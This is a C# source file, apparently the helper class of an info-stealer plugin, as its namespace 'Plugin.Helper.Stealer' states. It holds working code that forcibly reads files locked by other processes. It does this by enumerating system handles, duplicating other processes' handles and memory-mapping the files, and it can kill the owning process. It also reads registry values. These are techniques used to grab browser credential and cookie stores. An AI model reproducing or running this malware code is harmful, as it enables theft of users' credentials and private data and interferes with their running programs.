

using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Win32;


namespace Plugin.Helper.Stealer
{     
	public static class Utils
	{
		private static RegistryView[] registryViews = new RegistryView[2]
		{
			RegistryView.Registry64,
			RegistryView.Registry32
		};

		public static bool ForceCopy(string target, string destination)
		{
			byte[] bytes = Utils.ForceReadFile(target);
			if (bytes == null)
				return false;
			try
			{
				File.WriteAllBytes(destination, bytes);
			}
			catch
			{
				return false;
			}
			return true;
		}

		public static string ForceReadFileString(string filePath, bool killOwningProcessIfCouldntAquire = false)
		{
			byte[] bytes = Utils.ForceReadFile(filePath, killOwningProcessIfCouldntAquire);
			if (bytes == null)
				return (string) null;
			try
			{
				return Encoding.UTF8.GetString(bytes);
			}
			catch
			{
			}
			return (string) null;
		}

		public static byte[] ForceReadFile(string filePath, bool killOwningProcessIfCouldntAquire = false)
		{
			try
			{
				return File.ReadAllBytes(filePath);
			}
			catch (Exception ex)
			{
				if (ex.HResult != -2147024864)
					return (byte[]) null;
			}
			bool flag = false;
			int[] process;
			if (!Utils.GetProcessLockingFile(filePath, out process))
				flag = true;
			uint ReturnLength = 0;
			uint num1 = 3221225476;
			int cb = Marshal.SizeOf(typeof (InternalStructs.SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX));
			IntPtr num2 = Marshal.AllocHGlobal(cb);
			uint num3;
			do
			{
				num3 = NativeMethods.NtQuerySystemInformation(InternalStructs.SYSTEM_INFORMATION_CLASS.SystemExtendedHandleInformation, num2, ReturnLength, out ReturnLength);
				if ((int) num3 == (int) num1)
					num2 = Marshal.ReAllocHGlobal(num2, (IntPtr) (long) ReturnLength);
			}
			while (num3 != 0U);
			IntPtr hglobal = num2;
			ulong num4 = (ulong) (long) Marshal.ReadIntPtr(num2);
			IntPtr num5 = num2 + 2 * IntPtr.Size;
			byte[] numArray = (byte[]) null;
			for (ulong index = 0; index < num4; ++index)
			{
				InternalStructs.SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX structure = Marshal.PtrToStructure<InternalStructs.SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX>(num5 + (int) ((long) index * (long) (uint) cb));
				IntPtr newHandle;
				if ((flag || ((IEnumerable<int>) process).Contains<int>((int) (uint) structure.UniqueProcessId)) && Utils.DupHandle((int) (uint) structure.UniqueProcessId, (IntPtr) (long) (ulong) structure.HandleValue, out newHandle))
				{
					if (NativeMethods.GetFileType(newHandle) != InternalStructs.FileType.FILE_TYPE_DISK)
					{
						NativeMethods.CloseHandle(newHandle);
					}
					else
					{
						string str = Utils.GetPathFromHandle(newHandle);
						if (str == null)
						{
							NativeMethods.CloseHandle(newHandle);
						}
						else
						{
							if (str.StartsWith("\\\\?\\"))
								str = str.Substring(4);
							if (str == filePath)
							{
								numArray = Utils.ReadFileBytesFromHandle(newHandle);
								NativeMethods.CloseHandle(newHandle);
								if (numArray != null)
									break;
							}
							NativeMethods.CloseHandle(newHandle);
						}
					}
				}
			}
			Marshal.FreeHGlobal(hglobal);
			if (numArray == null & killOwningProcessIfCouldntAquire)
			{
				foreach (int pid in process)
					Utils.KillProcess(pid);
				try
				{
					numArray = File.ReadAllBytes(filePath);
				}
				catch
				{
				}
			}
			return numArray;
		}

		public static string GetPathFromHandle(IntPtr file)
		{
			uint dwFlags = 0;
			StringBuilder lpszFilePath = new StringBuilder(32769);
			uint pathNameByHandleW = NativeMethods.GetFinalPathNameByHandleW(file, lpszFilePath, (uint) lpszFilePath.Capacity, dwFlags);
			return pathNameByHandleW == 0U ? (string) null : lpszFilePath.ToString(0, (int) pathNameByHandleW);
		}

		public static bool DupHandle(int sourceProc, IntPtr sourceHandle, out IntPtr newHandle)
		{
			newHandle = IntPtr.Zero;
			uint dwOptions = 2;
			IntPtr num = NativeMethods.OpenProcess(64U, false, (uint) sourceProc);
			if (num == IntPtr.Zero)
				return false;
			IntPtr zero = IntPtr.Zero;
			if (!NativeMethods.DuplicateHandle(num, sourceHandle, NativeMethods.GetCurrentProcess(), ref zero, 0U, false, dwOptions))
			{
				NativeMethods.CloseHandle(num);
				return false;
			}
			newHandle = zero;
			NativeMethods.CloseHandle(num);
			return true;
		}

		public static bool GetProcessLockingFile(string filePath, out int[] process)
		{
			process = (int[]) null;
			uint num1 = 234;
			string strSessionKey = Guid.NewGuid().ToString();
			uint pSessionHandle;
			if (NativeMethods.RmStartSession(out pSessionHandle, 0U, strSessionKey) != 0U)
				return false;
			string[] rgsFileNames = new string[1]{ filePath };
			if (NativeMethods.RmRegisterResources(pSessionHandle, (uint) rgsFileNames.Length, rgsFileNames, 0U, (InternalStructs.RM_UNIQUE_PROCESS[]) null, 0U, (string[]) null) != 0U)
			{
				int num2 = (int) NativeMethods.RmEndSession(pSessionHandle);
				return false;
			}
			uint pnProcInfoNeeded;
			uint num3;
			do
			{
				uint pnProcInfo = 0;
				InternalStructs.RM_REBOOT_REASON lpdwRebootReasons;
				if ((int) NativeMethods.RmGetList(pSessionHandle, out pnProcInfoNeeded, ref pnProcInfo, (InternalStructs.RM_PROCESS_INFO[]) null, out lpdwRebootReasons) != (int) num1)
				{
					int num4 = (int) NativeMethods.RmEndSession(pSessionHandle);
					process = new int[0];
					return true;
				}
				num3 = pnProcInfoNeeded;
				InternalStructs.RM_PROCESS_INFO[] rgAffectedApps = new InternalStructs.RM_PROCESS_INFO[(int) pnProcInfoNeeded];
				pnProcInfo = pnProcInfoNeeded;
				if (NativeMethods.RmGetList(pSessionHandle, out pnProcInfoNeeded, ref pnProcInfo, rgAffectedApps, out lpdwRebootReasons) == 0U)
				{
					process = new int[rgAffectedApps.Length];
					for (int index = 0; index < rgAffectedApps.Length; ++index)
						process[index] = (int) rgAffectedApps[index].Process.dwProcessId;

                    NativeMethods.RmEndSession(pSessionHandle);
                    return true;
                }
			}
			while ((int) num3 != (int)pnProcInfoNeeded);
			NativeMethods.RmEndSession(pSessionHandle);
			return false;
		}

		public static byte[] ReadFileBytesFromHandle(IntPtr handle)
		{
			uint flProtect = 2;
			uint dwDesiredAccess = 4;
			IntPtr fileMappingA = NativeMethods.CreateFileMappingA(handle, IntPtr.Zero, flProtect, 0U, 0U, (string) null);
			if (fileMappingA == IntPtr.Zero)
				return (byte[]) null;
			ulong FileSize;
			if (!NativeMethods.GetFileSizeEx(handle, out FileSize))
			{
				NativeMethods.CloseHandle(fileMappingA);
				return (byte[]) null;
			}
			IntPtr num = NativeMethods.MapViewOfFile(fileMappingA, dwDesiredAccess, 0U, 0U, (UIntPtr) FileSize);
			if (num == IntPtr.Zero)
			{
				NativeMethods.CloseHandle(fileMappingA);
				return (byte[]) null;
			}
			byte[] destination = new byte[FileSize];
			Marshal.Copy(num, destination, 0, (int) FileSize);
			NativeMethods.UnmapViewOfFile(num);
			NativeMethods.CloseHandle(fileMappingA);
			return destination;
		}

		public static bool KillProcess(int pid, uint exitcode = 0)
		{
			IntPtr hProcess = NativeMethods.OpenProcess(1U, false, (uint) pid);
			if (hProcess == IntPtr.Zero)
				return false;
			bool flag = NativeMethods.TerminateProcess(hProcess, exitcode);
			NativeMethods.CloseHandle(hProcess);
			return flag;
		}

		public static bool CompareByteArrays(byte[] b1, byte[] b2)
		{
			if (b1 == null || b2 == null)
				return b1 == b2;
			return b1.Length == b2.Length && NativeMethods.memcmp(b1, b2, (UIntPtr) (ulong) b1.Length) == 0;
		}

		public static string ReverseString(string str)
		{
			char[] charArray = str.ToCharArray();
			Array.Reverse((Array) charArray);
			return new string(charArray);
		}

		public static object ReadRegistryKeyValue(RegistryHive hive, string location, string value)
		{
			foreach (RegistryView registryView in Utils.registryViews)
			{
				if (registryView != RegistryView.Registry64 || Environment.Is64BitOperatingSystem)
				{
					RegistryKey registryKey1 = (RegistryKey) null;
					RegistryKey registryKey2 = (RegistryKey) null;
					try
					{
						registryKey1 = RegistryKey.OpenBaseKey(hive, registryView);
						if (registryKey1 != null)
						{
							registryKey2 = registryKey1.OpenSubKey(location);
							if (registryKey2 == null)
							{
								registryKey1.Dispose();
							}
							else
							{
								object obj = registryKey2.GetValue(value);
								if (obj != null)
									return obj;
								registryKey1.Dispose();
								registryKey2.Dispose();
							}
						}
					}
					catch
					{
					}
					finally
					{
						registryKey1?.Dispose();
						registryKey2?.Dispose();
					}
				}
			}
			return (object) null;
		}

		public static byte[] ConvertHexStringToByteArray(string hexString)
		{
			if (hexString.Length % 2 != 0)
				return (byte[]) null;
			byte[] byteArray = new byte[hexString.Length / 2];
			for (int index = 0; index < byteArray.Length; ++index)
			{
				string s = hexString.Substring(index * 2, 2);
				byteArray[index] = byte.Parse(s, NumberStyles.HexNumber, (IFormatProvider) CultureInfo.InvariantCulture);
			}
			return byteArray;
		}
	}
}
